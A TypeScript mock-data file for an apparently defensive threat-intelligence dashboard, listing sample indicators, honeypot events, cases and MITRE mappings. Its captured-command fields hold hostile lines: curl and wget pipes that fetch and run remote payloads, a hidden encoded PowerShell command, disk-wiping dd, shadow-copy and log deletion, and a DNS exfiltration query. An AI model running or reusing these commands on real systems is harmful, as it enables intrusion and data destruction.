import {
  IoCIndicator,
  GNNNode,
  GNNEdge,
  ThreatFeedItem,
  InvestigationCase,
  MitreTacticGroup,
  DashboardStats,
  UserProfile
} from './types';

export const INITIAL_USER: UserProfile = {
  id: 'usr-analyst-984',
  name: 'Sarah Chen',
  email: 's.chen@threatlens.soc.internal',
  role: 'ANALYST',
  clearance: 'TOP SECRET // TK-SI',
  unit: 'Global Cyber Defense & Threat Intelligence Center',
  activeSessionExpiry: '07:42:18'
};

export const MOCK_USER_PROFILE = INITIAL_USER;

export const INITIAL_STATS: DashboardStats = {
  highRiskIoCs: 42,
  activeHoneypotAlerts: 187,
  pendingCases: 6,
  avgFusionRiskScore: 79.4,
  totalIoCsMonitored: 14890,
  honeypotsOnline: 14
};

export const MOCK_DASHBOARD_STATS = INITIAL_STATS;

export const MOCK_IOCS: IoCIndicator[] = [
  {
    id: 'ioc-001',
    value: '194.26.29.114',
    type: 'ip',
    infrastructureScore: 92,
    behavioralScore: 96,
    fusionScore: 94.4,
    riskLevel: 'CRITICAL',
    asn: 'AS44050 (HostKey B.V.)',
    country: 'Netherlands',
    countryCode: 'NL',
    firstSeen: '2026-08-30 03:14:02 UTC',
    lastActive: '2 mins ago',
    honeypotSource: 'Cowrie-Telnet-01 (Frankfurt)',
    threatActorAttribution: 'UNC3886 / Volt Typhoon Cluster',
    cveAssociations: ['CVE-2024-21887', 'CVE-2023-46805'],
    tags: ['C2 Teamserver', 'SSH Brute-Force', 'ICS Scanner', 'Fast-Flux'],
    connectionPatterns: {
      protocol: 'TCP/SSH/Telnet',
      sessionsCount: 384,
      durationAvgSec: 14.2,
      payloadTransferredKb: 2840,
      burstPattern: 'Volumetric Burst'
    },
    failedAuthAttempts: [
      { timestamp: '22:28:11', username: 'root', passwordSnippet: 'admin1234', service: 'SSH:22' },
      { timestamp: '22:28:14', username: 'admin', passwordSnippet: 'toor', service: 'SSH:22' },
      { timestamp: '22:28:19', username: 'support', passwordSnippet: 'support@2024', service: 'SSH:22' },
      { timestamp: '22:28:25', username: 'cisco', passwordSnippet: 'cisco123', service: 'Telnet:23' },
      { timestamp: '22:28:31', username: 'operator', passwordSnippet: 'scada_adm', service: 'Modbus:502' }
    ],
    portActivity: [
      { port: 22, service: 'SSH-2.0-OpenSSH_8.9p1', hits: 1420, status: 'OPEN' },
      { port: 23, service: 'Telnet (BusyBox emulation)', hits: 890, status: 'HONEYPOT_EMULATED' },
      { port: 445, service: 'SMBv1/SMBv2 probe', hits: 310, status: 'FILTERED' },
      { port: 502, service: 'Modbus ICS/SCADA telemetry', hits: 174, status: 'HONEYPOT_EMULATED' },
      { port: 8080, service: 'HTTP Alternate / WebShell Staging', hits: 520, status: 'OPEN' }
    ],
    executedCommands: [
      { timestamp: '22:28:32', command: 'uname -a; cat /proc/cpuinfo | grep "model name"', riskScore: 78, category: 'Discovery' },
      { timestamp: '22:28:34', command: 'curl -s -k http://194.26.29.114:8080/stage2.sh | sh', riskScore: 98, category: 'Execution' },
      { timestamp: '22:28:36', command: 'chmod +x /tmp/.kworker_init && nohup /tmp/.kworker_init &', riskScore: 95, category: 'Persistence' },
      { timestamp: '22:28:39', command: 'rm -f /var/log/lastlog /var/log/wtmp ~/.bash_history', riskScore: 89, category: 'Defense Evasion' }
    ],
    mitreMappings: [
      { tactic: 'Initial Access', tacticId: 'TA0001', technique: 'Exploit Public-Facing Application', techniqueId: 'T1190', confidence: 95, evidence: 'Automated Ivanti Connect Secure zero-day probe payload header' },
      { tactic: 'Execution', tacticId: 'TA0002', technique: 'Command and Scripting Interpreter: Unix Shell', techniqueId: 'T1059.004', confidence: 98, evidence: 'Piped curl shell execution to staging script in Cowrie shell trap' },
      { tactic: 'Defense Evasion', tacticId: 'TA0005', technique: 'Indicator Removal: Clear Command History', techniqueId: 'T1070.003', confidence: 92, evidence: 'Forced rm -f bash history and syslog artifacts post-payload drop' },
      { tactic: 'Command and Control', tacticId: 'TA0011', technique: 'Application Layer Protocol: Web Protocols', techniqueId: 'T1071.001', confidence: 94, evidence: 'Periodic HTTPS beaconing to port 8080 with jittered heartbeat interval' }
    ],
    gnnClusterId: 'cluster-apt-alpha'
  },
  {
    id: 'ioc-002',
    value: 'synch-update-cloud.com',
    type: 'domain',
    infrastructureScore: 88,
    behavioralScore: 91,
    fusionScore: 89.8,
    riskLevel: 'CRITICAL',
    asn: 'AS200052 (Fastly Edge Proxy Masquerade)',
    country: 'United States',
    countryCode: 'US',
    firstSeen: '2026-08-31 11:45:19 UTC',
    lastActive: '14 mins ago',
    honeypotSource: 'Dionaea-SMB-04 (Tokyo)',
    threatActorAttribution: 'FIN7 / Carbanak Evolution',
    cveAssociations: ['CVE-2023-38831', 'CVE-2024-38112'],
    tags: ['Typosquatted Domain', 'Fast-Flux DNS', 'Payload Hosting', 'Stealth C2'],
    connectionPatterns: {
      protocol: 'HTTPS / TLS 1.3',
      sessionsCount: 198,
      durationAvgSec: 62.4,
      payloadTransferredKb: 8920,
      burstPattern: 'Periodic Beacon'
    },
    failedAuthAttempts: [
      { timestamp: '22:15:02', username: 'NT_AUTHORITY\\SYSTEM', passwordSnippet: 'Kerberos Ticket Injection', service: 'SMB:445' },
      { timestamp: '22:15:18', username: 'CORP\\krbtgt', passwordSnippet: 'Silver Ticket Hash', service: 'Kerberos:88' }
    ],
    portActivity: [
      { port: 443, service: 'HTTPS (Let\'s Encrypt 3-day cert)', hits: 870, status: 'OPEN' },
      { port: 8443, service: 'mTLS Custom C2 Agent Port', hits: 410, status: 'OPEN' },
      { port: 445, service: 'SMB Direct Protocol', hits: 240, status: 'HONEYPOT_EMULATED' }
    ],
    executedCommands: [
      { timestamp: '22:16:04', command: 'powershell -nop -w hidden -enc JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAA...', riskScore: 99, category: 'Execution' },
      { timestamp: '22:16:15', command: 'rundll32.exe \\\\synch-update-cloud.com\\share\\core.dll,EntryPoint', riskScore: 96, category: 'Execution' },
      { timestamp: '22:16:40', command: 'nltest /dclist:CORP /domain_trusts', riskScore: 82, category: 'Discovery' }
    ],
    mitreMappings: [
      { tactic: 'Execution', tacticId: 'TA0002', technique: 'Command and Scripting Interpreter: PowerShell', techniqueId: 'T1059.001', confidence: 99, evidence: 'Base64 encoded AMSI-bypass memory reflective DLL injection' },
      { tactic: 'Persistence', tacticId: 'TA0003', technique: 'Scheduled Task/Job', techniqueId: 'T1053', confidence: 88, evidence: 'Created task "SystemSyncCheck" referencing external remote UNC payload' },
      { tactic: 'Command and Control', tacticId: 'TA0011', technique: 'Dynamic Resolution: Fast Flux DNS', techniqueId: 'T1568.001', confidence: 91, evidence: 'DNS A-record rotated across 18 distinct residential proxy IP pools within 60 minutes' }
    ],
    gnnClusterId: 'cluster-fin-bravo'
  },
  {
    id: 'ioc-003',
    value: '91.240.118.66',
    type: 'ip',
    infrastructureScore: 84,
    behavioralScore: 86,
    fusionScore: 85.2,
    riskLevel: 'HIGH',
    asn: 'AS51852 (Private Layer Inc.)',
    country: 'Switzerland',
    countryCode: 'CH',
    firstSeen: '2026-09-01 08:20:00 UTC',
    lastActive: '32 mins ago',
    honeypotSource: 'HoneyPy-SSH-01 (Singapore)',
    threatActorAttribution: 'LockBit 4.0 Affiliate / RansomHub Stager',
    cveAssociations: ['CVE-2024-1709'],
    tags: ['Ransomware Stager', 'ScreenConnect Exploit', 'Cobalt Strike'],
    connectionPatterns: {
      protocol: 'TCP/WebSockets',
      sessionsCount: 142,
      durationAvgSec: 4.8,
      payloadTransferredKb: 14200,
      burstPattern: 'Sustained'
    },
    failedAuthAttempts: [
      { timestamp: '21:55:04', username: 'admin', passwordSnippet: 'P@ssw0rd2024!', service: 'HTTP-Auth' },
      { timestamp: '21:55:20', username: 'backup_svc', passwordSnippet: 'VeeamAdmin!', service: 'RPC:135' }
    ],
    portActivity: [
      { port: 8040, service: 'ConnectWise ScreenConnect Stager', hits: 560, status: 'OPEN' },
      { port: 443, service: 'Cobalt Strike malleable C2 profile', hits: 920, status: 'OPEN' },
      { port: 3389, service: 'RDP Honeypot BlueKeep Probe', hits: 180, status: 'HONEYPOT_EMULATED' }
    ],
    executedCommands: [
      { timestamp: '21:57:12', command: 'vssadmin.exe delete shadows /all /quiet', riskScore: 99, category: 'Impact' },
      { timestamp: '21:57:18', command: 'wbadmin delete catalog -quiet', riskScore: 97, category: 'Impact' },
      { timestamp: '21:57:24', command: 'wevtutil.exe cl System && wevtutil.exe cl Security', riskScore: 94, category: 'Defense Evasion' }
    ],
    mitreMappings: [
      { tactic: 'Impact', tacticId: 'TA0040', technique: 'Inhibit System Recovery', techniqueId: 'T1490', confidence: 98, evidence: 'Execution of vssadmin delete shadows to prevent volume restore' },
      { tactic: 'Initial Access', tacticId: 'TA0001', technique: 'Exploit Public-Facing Application', techniqueId: 'T1190', confidence: 90, evidence: 'ScreenConnect setup wizard path traversal authentication bypass attempt' }
    ],
    gnnClusterId: 'cluster-ransom-gamma'
  },
  {
    id: 'ioc-004',
    value: '7b9c31fa7d8893d2567f2931ea454c7d812bf087e8346129845763261a8ef141',
    type: 'hash',
    infrastructureScore: 78,
    behavioralScore: 94,
    fusionScore: 87.6,
    riskLevel: 'HIGH',
    asn: 'N/A (PE32+ Executable / ELF Hybrid)',
    country: 'Russian Federation',
    countryCode: 'RU',
    firstSeen: '2026-09-01 14:12:44 UTC',
    lastActive: '1 hour ago',
    honeypotSource: 'Conpot-ICS-02 (Dallas)',
    threatActorAttribution: 'Sandworm / Electrum ICS Disruption',
    cveAssociations: ['CVE-2022-26134'],
    tags: ['Wiper Component', 'IEC-104 Protocol', 'SCADA Manipulator', 'ELF Dropper'],
    connectionPatterns: {
      protocol: 'IEC-60870-5-104 / OPC-UA',
      sessionsCount: 64,
      durationAvgSec: 180.5,
      payloadTransferredKb: 640,
      burstPattern: 'Stealth Low-Frequency'
    },
    failedAuthAttempts: [
      { timestamp: '21:12:00', username: 'engineer', passwordSnippet: 'siemens_s7', service: 'Siemens-S7:102' },
      { timestamp: '21:12:30', username: 'scada_root', passwordSnippet: 'master123', service: 'OPC-UA:4840' }
    ],
    portActivity: [
      { port: 102, service: 'Siemens S7 Comm Protocol', hits: 340, status: 'HONEYPOT_EMULATED' },
      { port: 2404, service: 'IEC-104 Grid Telecontrol', hits: 520, status: 'HONEYPOT_EMULATED' },
      { port: 502, service: 'Modbus TCP', hits: 610, status: 'HONEYPOT_EMULATED' }
    ],
    executedCommands: [
      { timestamp: '21:14:10', command: './scada_kill --kill-switches --abort-interlocks', riskScore: 100, category: 'Impact' },
      { timestamp: '21:14:45', command: 'dd if=/dev/urandom of=/dev/sda bs=4M', riskScore: 100, category: 'Impact' }
    ],
    mitreMappings: [
      { tactic: 'Impact', tacticId: 'TA0040', technique: 'Data Destruction', techniqueId: 'T1485', confidence: 99, evidence: 'Targeted raw drive sector overwrite with /dev/urandom' },
      { tactic: 'Lateral Movement', tacticId: 'TA0008', technique: 'Remote Services: SMB/Windows Admin Shares', techniqueId: 'T1021.002', confidence: 85, evidence: 'Probing isolated substation VLANs through dual-homed jump hosts' }
    ],
    gnnClusterId: 'cluster-scada-delta'
  },
  {
    id: 'ioc-005',
    value: '45.154.255.89',
    type: 'ip',
    infrastructureScore: 68,
    behavioralScore: 72,
    fusionScore: 70.4,
    riskLevel: 'MEDIUM',
    asn: 'AS208605 (Chinanet Backbone Reseller)',
    country: 'China',
    countryCode: 'CN',
    firstSeen: '2026-09-02 02:00:15 UTC',
    lastActive: '45 mins ago',
    honeypotSource: 'Cowrie-Telnet-01 (Frankfurt)',
    threatActorAttribution: 'Mirai Variant / IZ1H9 Mirai Spreader',
    cveAssociations: ['CVE-2023-1389', 'CVE-2024-3273'],
    tags: ['IoT Scanner', 'DDoS Botnet', 'D-Link Exploit', 'Telnet Probe'],
    connectionPatterns: {
      protocol: 'Telnet / HTTP GET',
      sessionsCount: 1120,
      durationAvgSec: 1.2,
      payloadTransferredKb: 140,
      burstPattern: 'Volumetric Burst'
    },
    failedAuthAttempts: [
      { timestamp: '21:40:01', username: 'default', passwordSnippet: 'default', service: 'Telnet:23' },
      { timestamp: '21:40:02', username: 'root', passwordSnippet: 'vizxv', service: 'Telnet:23' },
      { timestamp: '21:40:04', username: 'admin', passwordSnippet: 'smcadmin', service: 'Telnet:23' }
    ],
    portActivity: [
      { port: 23, service: 'Telnet', hits: 4500, status: 'HONEYPOT_EMULATED' },
      { port: 80, service: 'HTTP D-Link HNAP1 Exploit', hits: 1820, status: 'HONEYPOT_EMULATED' }
    ],
    executedCommands: [
      { timestamp: '21:41:00', command: 'cd /tmp || cd /var/run || cd /dev/shm; wget http://45.154.255.89/bins/mirai.arm7; chmod 777 mirai.arm7; ./mirai.arm7', riskScore: 89, category: 'Execution' }
    ],
    mitreMappings: [
      { tactic: 'Execution', tacticId: 'TA0002', technique: 'Command and Scripting Interpreter: Unix Shell', techniqueId: 'T1059.004', confidence: 91, evidence: 'wget binary dropper script in /tmp ramdisk directory' },
      { tactic: 'Initial Access', tacticId: 'TA0001', technique: 'Exploit Public-Facing Application', techniqueId: 'T1190', confidence: 84, evidence: 'TP-Link Archer & D-Link command injection URIs' }
    ],
    gnnClusterId: 'cluster-mirai-echo'
  },
  {
    id: 'ioc-006',
    value: 'dns-over-https-cloudflare.xyz',
    type: 'domain',
    infrastructureScore: 76,
    behavioralScore: 82,
    fusionScore: 79.6,
    riskLevel: 'HIGH',
    asn: 'AS13335 (Tunnel Transit Masquerade)',
    country: 'Panama',
    countryCode: 'PA',
    firstSeen: '2026-09-02 05:30:11 UTC',
    lastActive: '5 mins ago',
    honeypotSource: 'Glastopf-HTTP-03 (London)',
    threatActorAttribution: 'Mustang Panda / Bronze President',
    cveAssociations: ['CVE-2024-27198'],
    tags: ['DNS Exfiltration', 'DNS Tunneling', 'PlugX C2', 'Typosquatting'],
    connectionPatterns: {
      protocol: 'DNS / DoH (Port 53 & 443)',
      sessionsCount: 380,
      durationAvgSec: 12.0,
      payloadTransferredKb: 4500,
      burstPattern: 'Periodic Beacon'
    },
    failedAuthAttempts: [],
    portActivity: [
      { port: 53, service: 'DNS Recursion & Tunnel Handler', hits: 3100, status: 'OPEN' },
      { port: 443, service: 'DoH JSON Proxy Gateway', hits: 1400, status: 'OPEN' }
    ],
    executedCommands: [
      { timestamp: '22:04:10', command: 'nslookup -q=TXT bWFsaWNpb3VzX3NlY3JldHM.dns-over-https-cloudflare.xyz', riskScore: 85, category: 'Exfiltration' }
    ],
    mitreMappings: [
      { tactic: 'Exfiltration', tacticId: 'TA0010', technique: 'Exfiltration Over Alternative Protocol: DNS', techniqueId: 'T1048.003', confidence: 94, evidence: 'Base64 encoded subdomains observed exfiltrating kerberos tickets via recursive DNS TXT queries' },
      { tactic: 'Command and Control', tacticId: 'TA0011', technique: 'Protocol Tunneling', techniqueId: 'T1572', confidence: 90, evidence: 'DNS over HTTPS tunnel encapsulation bypasses border next-gen firewalls' }
    ],
    gnnClusterId: 'cluster-doh-foxtrot'
  },
  {
    id: 'ioc-007',
    value: '185.220.101.5',
    type: 'ip',
    infrastructureScore: 55,
    behavioralScore: 60,
    fusionScore: 58.0,
    riskLevel: 'MEDIUM',
    asn: 'AS208294 (Zwiebelfreunde e.V. Tor Exit)',
    country: 'Germany',
    countryCode: 'DE',
    firstSeen: '2026-09-01 19:10:00 UTC',
    lastActive: '12 mins ago',
    honeypotSource: 'HoneyPy-SSH-01 (Singapore)',
    threatActorAttribution: 'Tor Exit Anonymizer / Untrusted Probe',
    cveAssociations: [],
    tags: ['Tor Exit Node', 'Mass Port Scan', 'Anonymous Relay'],
    connectionPatterns: {
      protocol: 'TCP SYN Scan',
      sessionsCount: 890,
      durationAvgSec: 0.8,
      payloadTransferredKb: 45,
      burstPattern: 'Volumetric Burst'
    },
    failedAuthAttempts: [
      { timestamp: '22:18:10', username: 'root', passwordSnippet: '123456', service: 'SSH:22' }
    ],
    portActivity: [
      { port: 22, service: 'SSH Port Scan', hits: 980, status: 'HONEYPOT_EMULATED' },
      { port: 80, service: 'HTTP Probe', hits: 450, status: 'HONEYPOT_EMULATED' }
    ],
    executedCommands: [],
    mitreMappings: [
      { tactic: 'Discovery', tacticId: 'TA0007', technique: 'Network Service Discovery', techniqueId: 'T1046', confidence: 82, evidence: 'Broad sequential port sweeps from recognized Tor exit relay' }
    ],
    gnnClusterId: 'cluster-tor-golf'
  },
  {
    id: 'ioc-008',
    value: 'update-service-cdn-telemetry.org',
    type: 'domain',
    infrastructureScore: 40,
    behavioralScore: 35,
    fusionScore: 37.0,
    riskLevel: 'LOW',
    asn: 'AS15169 (Google Cloud LLC)',
    country: 'United States',
    countryCode: 'US',
    firstSeen: '2026-08-25 10:00:00 UTC',
    lastActive: '3 hours ago',
    honeypotSource: 'Glastopf-HTTP-03 (London)',
    threatActorAttribution: 'Benign Security Scanner / Rapid7 Sonar',
    cveAssociations: [],
    tags: ['Security Research', 'Crawler', 'Benign Scan'],
    connectionPatterns: {
      protocol: 'HTTP/HTTPS GET',
      sessionsCount: 45,
      durationAvgSec: 2.1,
      payloadTransferredKb: 120,
      burstPattern: 'Sustained'
    },
    failedAuthAttempts: [],
    portActivity: [
      { port: 80, service: 'HTTP Banner Grab', hits: 45, status: 'OPEN' }
    ],
    executedCommands: [],
    mitreMappings: [
      { tactic: 'Reconnaissance', tacticId: 'TA0043', technique: 'Active Scanning', techniqueId: 'T1595', confidence: 60, evidence: 'Standard HTTP GET request with Project Sonar User-Agent header' }
    ]
  }
];

export const MOCK_GNN_NODES: GNNNode[] = [
  { id: '194.26.29.114', label: '194.26.29.114', type: 'ioc', riskScore: 94, degree: 5, details: 'Primary C2 Stager & Telnet Honeypot Attacker' },
  { id: 'AS44050', label: 'AS44050 HostKey B.V.', type: 'asn', riskScore: 78, degree: 4, details: 'Bulletproof Host AS with high malicious ratio' },
  { id: 'synch-update-cloud.com', label: 'synch-update-cloud.com', type: 'pdns', riskScore: 90, degree: 4, details: 'Fast-flux domain resolved to bulletproof range' },
  { id: 'stage2.sh', label: 'Hash: 4a2d..e89f (stage2.sh)', type: 'malware', riskScore: 95, degree: 3, details: 'ELF Linux botnet loader dropped in Cowrie' },
  { id: 'c2.darknet-beacon.biz', label: 'c2.darknet-beacon.biz', type: 'c2', riskScore: 92, degree: 3, details: 'Secondary fallback C2 server domain' },
  { id: '91.240.118.66', label: '91.240.118.66', type: 'ioc', riskScore: 85, degree: 3, details: 'LockBit affiliate ransomware distribution node' },
  { id: 'AS51852', label: 'AS51852 Private Layer', type: 'asn', riskScore: 70, degree: 2, details: 'Offshore hosting provider in Switzerland' },
  { id: 'screenconnect-stager.dll', label: 'Hash: b71a..3381 (payload.dll)', type: 'malware', riskScore: 96, degree: 2, details: 'Ransomware reflective loader' },
  { id: 'dns-over-https-cloudflare.xyz', label: 'dns-cloudflare.xyz', type: 'pdns', riskScore: 80, degree: 3, details: 'Mustang Panda DoH exfiltration tunnel' },
  { id: 'AS208605', label: 'AS208605 Chinanet Reseller', type: 'asn', riskScore: 65, degree: 2, details: 'Mirai spreader source infrastructure' },
  { id: '45.154.255.89', label: '45.154.255.89', type: 'ioc', riskScore: 70, degree: 2, details: 'Mirai scanner targeting port 23/80' }
];

export const MOCK_GNN_EDGES: GNNEdge[] = [
  { id: 'e1', source: '194.26.29.114', target: 'AS44050', relation: 'hosted_on', confidence: 0.99 },
  { id: 'e2', source: 'synch-update-cloud.com', target: '194.26.29.114', relation: 'resolves_to', confidence: 0.94 },
  { id: 'e3', source: '194.26.29.114', target: 'stage2.sh', relation: 'drops_hash', confidence: 0.98 },
  { id: 'e4', source: 'stage2.sh', target: 'c2.darknet-beacon.biz', relation: 'beacon_target', confidence: 0.91 },
  { id: 'e5', source: 'c2.darknet-beacon.biz', target: 'AS44050', relation: 'hosted_on', confidence: 0.93 },
  { id: 'e6', source: '91.240.118.66', target: 'AS51852', relation: 'hosted_on', confidence: 0.98 },
  { id: 'e7', source: '91.240.118.66', target: 'screenconnect-stager.dll', relation: 'drops_hash', confidence: 0.95 },
  { id: 'e8', source: 'dns-over-https-cloudflare.xyz', target: '194.26.29.114', relation: 'shares_cert', confidence: 0.82 },
  { id: 'e9', source: '45.154.255.89', target: 'AS208605', relation: 'hosted_on', confidence: 0.97 },
  { id: 'e10', source: '45.154.255.89', target: 'stage2.sh', relation: 'drops_hash', confidence: 0.74 }
];

export const MOCK_THREAT_FEED_ITEMS: ThreatFeedItem[] = [
  {
    id: 'feed-001',
    timestamp: '22:30:08 UTC',
    indicator: '194.26.29.114',
    type: 'ip',
    honeypotName: 'Cowrie-Telnet-01',
    rawEvent: 'SSH brute force burst (18 sessions/sec, login attempts: root, operator)',
    normalizedSeverity: 'CRITICAL',
    port: 22,
    payloadPreview: 'USER root PASS admin1234 -> EXEC curl -s http://194.26.29.114:8080/sh',
    countryCode: 'NL'
  },
  {
    id: 'feed-002',
    timestamp: '22:29:55 UTC',
    indicator: 'synch-update-cloud.com',
    type: 'domain',
    honeypotName: 'Dionaea-SMB-04',
    rawEvent: 'SMB Tree Connect to IPC$ requesting ms17-010 shadow share',
    normalizedSeverity: 'CRITICAL',
    port: 445,
    payloadPreview: '\\\\synch-update-cloud.com\\share\\core.dll reflective DLL injected',
    countryCode: 'US'
  },
  {
    id: 'feed-003',
    timestamp: '22:29:41 UTC',
    indicator: '45.154.255.89',
    type: 'ip',
    honeypotName: 'Conpot-ICS-02',
    rawEvent: 'Modbus FC05 (Write Single Coil) burst targeting holding register 40001',
    normalizedSeverity: 'MEDIUM',
    port: 502,
    payloadPreview: 'Modbus PDU: 05 00 01 FF 00 (Emergency shutoff coil trigger)',
    countryCode: 'CN'
  },
  {
    id: 'feed-004',
    timestamp: '22:29:20 UTC',
    indicator: '7b9c31fa7d8893d2567f2931ea454c7d812bf087e8346129845763261a8ef141',
    type: 'hash',
    honeypotName: 'Cowrie-Telnet-01',
    rawEvent: 'ELF 64-bit LSB executable captured via anonymous FTP honeypot trap',
    normalizedSeverity: 'HIGH',
    port: 21,
    payloadPreview: 'SHA256: 7b9c31fa7d88... Anti-debug ptraces + Siemens S7 parser strings',
    countryCode: 'RU'
  },
  {
    id: 'feed-005',
    timestamp: '22:28:50 UTC',
    indicator: '91.240.118.66',
    type: 'ip',
    honeypotName: 'HoneyPy-SSH-01',
    rawEvent: 'ScreenConnect unauthenticated user creation URI probe detected',
    normalizedSeverity: 'HIGH',
    port: 8040,
    payloadPreview: 'POST /SetupWizard.aspx/CreateAdminAccount HTTP/1.1',
    countryCode: 'CH'
  },
  {
    id: 'feed-006',
    timestamp: '22:28:15 UTC',
    indicator: 'dns-over-https-cloudflare.xyz',
    type: 'domain',
    honeypotName: 'Glastopf-HTTP-03',
    rawEvent: 'High-entropy DNS TXT queries indicating encoded C2 heartbeat channel',
    normalizedSeverity: 'HIGH',
    port: 53,
    payloadPreview: 'TXT query: aW5pdF9iZWFjb25faWQ9OTkx.dns-over-https-cloudflare.xyz',
    countryCode: 'PA'
  },
  {
    id: 'feed-007',
    timestamp: '22:27:40 UTC',
    indicator: '185.220.101.5',
    type: 'ip',
    honeypotName: 'Cowrie-Telnet-01',
    rawEvent: 'Broad TCP SYN scan over ports 22, 23, 80, 443, 3389, 8080',
    normalizedSeverity: 'MEDIUM',
    port: 23,
    payloadPreview: 'Nmap OS fingerprint probe signature match (SYN stealth scan)',
    countryCode: 'DE'
  }
];

export const MOCK_CASES: InvestigationCase[] = [
  {
    id: 'case-001',
    caseNumber: 'CASE-2026-084',
    title: 'Operation IronCascade: Substation SCADA Compromise Attempt',
    description: 'Coordinated reconnaissance and credential injection targeting regional power grid distribution controllers via compromised HostKey bulletproof proxy nodes.',
    severity: 'CRITICAL',
    status: 'IN_PROGRESS',
    priority: 1,
    assignee: 'Sarah Chen (Senior Threat Hunter)',
    createdAt: '2026-08-31 16:40 UTC',
    updatedAt: '18 mins ago',
    iocIds: ['ioc-001', 'ioc-004'],
    sector: 'Critical Infrastructure / Energy',
    timelineEvents: [
      {
        id: 'tle-1',
        timestamp: '2026-08-31 16:12:04 UTC',
        stage: 'Initial Reconnaissance',
        title: 'Mass Honeypot Telnet & Modbus Port Scan',
        details: 'Attacker IP 194.26.29.114 initiated low-and-slow port sweeps against edge perimeter IP range, mapping ports 23, 102, and 502.',
        severity: 'MEDIUM',
        sourceIoC: '194.26.29.114',
        tactics: ['Reconnaissance', 'Discovery']
      },
      {
        id: 'tle-2',
        timestamp: '2026-08-31 16:25:30 UTC',
        stage: 'Credential Access',
        title: 'Dictionary Brute-Force against Emulated SCADA Gateway',
        details: 'Over 400 dictionary credential combinations attempted against Cowrie Telnet & Conpot ICS trap using default engineering usernames.',
        severity: 'HIGH',
        sourceIoC: '194.26.29.114',
        tactics: ['Credential Access', 'Initial Access']
      },
      {
        id: 'tle-3',
        timestamp: '2026-08-31 16:38:12 UTC',
        stage: 'Exploit Delivery & Execution',
        title: 'Automated Shell Dropper Invoked (stage2.sh)',
        details: 'Captured shell session executed curl pipe to remote HostKey IP staging server, dropping Linux ELF binary with anti-sandbox hooks.',
        severity: 'CRITICAL',
        sourceIoC: '7b9c31fa7d8893d2567f2931ea454c7d812bf087e8346129845763261a8ef141',
        tactics: ['Execution', 'Defense Evasion']
      },
      {
        id: 'tle-4',
        timestamp: '2026-08-31 16:45:00 UTC',
        stage: 'Command and Control',
        title: 'C2 Callback Beaconing Established',
        details: 'Payload attempted encrypted TLS 1.3 heartbeat to c2.darknet-beacon.biz with 15-second jittered beacon intervals.',
        severity: 'CRITICAL',
        sourceIoC: 'synch-update-cloud.com',
        tactics: ['Command and Control']
      },
      {
        id: 'tle-5',
        timestamp: '2026-08-31 17:10:00 UTC',
        stage: 'Containment Action',
        title: 'Automated BGP Blackhole & Firewall Block Rule Injected',
        details: 'Firewall ruleset updated to drop all inbound traffic from AS44050 prefix 194.26.29.0/24; endpoint isolation verified.',
        severity: 'LOW',
        sourceIoC: '194.26.29.114',
        analystNote: 'Verified zero egress leak from OT subnet. Honeypot telemetry fed back into GNN correlation pipeline.'
      }
    ]
  },
  {
    id: 'case-002',
    caseNumber: 'CASE-2026-085',
    title: 'Financial Entity Phishing Campaign with Fast-Flux C2 Beacons',
    description: 'High-frequency domain generation algorithm (DGA) and fast-flux DNS rotation masquerading as Cloudflare DoH proxy services.',
    severity: 'HIGH',
    status: 'NEW',
    priority: 2,
    assignee: 'Marcus Vance (Tier 2 SOC Lead)',
    createdAt: '2026-09-01 09:15 UTC',
    updatedAt: '1 hour ago',
    iocIds: ['ioc-002', 'ioc-006'],
    sector: 'Banking & Financial Services',
    timelineEvents: [
      {
        id: 'tle-201',
        timestamp: '2026-09-01 08:45:10 UTC',
        stage: 'Initial Weaponization',
        title: 'New Fast-Flux Domain Registration Detected in Passive DNS',
        details: 'Domain synch-update-cloud.com registered via privacy proxy; immediate resolution across 18 transient bulletproof IP addresses.',
        severity: 'HIGH',
        sourceIoC: 'synch-update-cloud.com',
        tactics: ['Resource Development']
      },
      {
        id: 'tle-202',
        timestamp: '2026-09-01 09:05:22 UTC',
        stage: 'Execution',
        title: 'PowerShell AMSI-Bypass Payload Intercepted in Sandbox',
        details: 'Base64 encoded payload executed in memory, invoking rundll32 with remote UNC path parameters.',
        severity: 'CRITICAL',
        sourceIoC: 'synch-update-cloud.com',
        tactics: ['Execution', 'Defense Evasion']
      }
    ]
  },
  {
    id: 'case-003',
    caseNumber: 'CASE-2026-086',
    title: 'LockBit / RansomHub Perimeter Staging via ScreenConnect Flaw',
    description: 'Exploitation of CVE-2024-1709 on unpatched remote support servers followed by shadow copy deletion scripts.',
    severity: 'HIGH',
    status: 'IN_PROGRESS',
    priority: 2,
    assignee: 'Elena Rostova (Incident Responder)',
    createdAt: '2026-09-01 20:00 UTC',
    updatedAt: '2 hours ago',
    iocIds: ['ioc-003'],
    sector: 'Healthcare & Pharmaceuticals',
    timelineEvents: [
      {
        id: 'tle-301',
        timestamp: '2026-09-01 19:40:15 UTC',
        stage: 'Initial Access',
        title: 'Authentication Bypass Exploit on ScreenConnect Port 8040',
        details: 'Attacker accessed /SetupWizard.aspx path, registering administrative user with system privileges.',
        severity: 'CRITICAL',
        sourceIoC: '91.240.118.66',
        tactics: ['Initial Access', 'Privilege Escalation']
      },
      {
        id: 'tle-302',
        timestamp: '2026-09-01 19:52:00 UTC',
        stage: 'Impact Stage',
        title: 'vssadmin Shadow Copy Deletion Command Intercepted',
        details: 'Honeypot shell trapped command string deleting VSS snapshots to inhibit system recovery.',
        severity: 'CRITICAL',
        sourceIoC: '91.240.118.66',
        tactics: ['Impact']
      }
    ]
  }
];

export const MOCK_MITRE_TACTIC_GROUPS: MitreTacticGroup[] = [
  {
    tacticId: 'TA0001',
    tacticName: 'Initial Access',
    description: 'Adversary attempting to gain initial foothold within the network.',
    techniques: [
      {
        id: 'T1190',
        name: 'Exploit Public-Facing Application',
        description: 'Vulnerability exploitation against Ivanti, ScreenConnect, and edge routers.',
        detectedCount: 48,
        associatedIoCs: ['194.26.29.114', '91.240.118.66', '45.154.255.89']
      },
      {
        id: 'T1078',
        name: 'Valid Accounts',
        description: 'Compromised default credentials utilized against Telnet and SSH traps.',
        detectedCount: 31,
        associatedIoCs: ['194.26.29.114', '185.220.101.5']
      }
    ]
  },
  {
    tacticId: 'TA0002',
    tacticName: 'Execution',
    description: 'Adversary attempting to run malicious code on honeypots or target endpoints.',
    techniques: [
      {
        id: 'T1059.004',
        name: 'Command & Scripting Interpreter: Unix Shell',
        description: 'Remote bash script execution piped directly from curl / wget web traps.',
        detectedCount: 64,
        associatedIoCs: ['194.26.29.114', '45.154.255.89']
      },
      {
        id: 'T1059.001',
        name: 'Command & Scripting Interpreter: PowerShell',
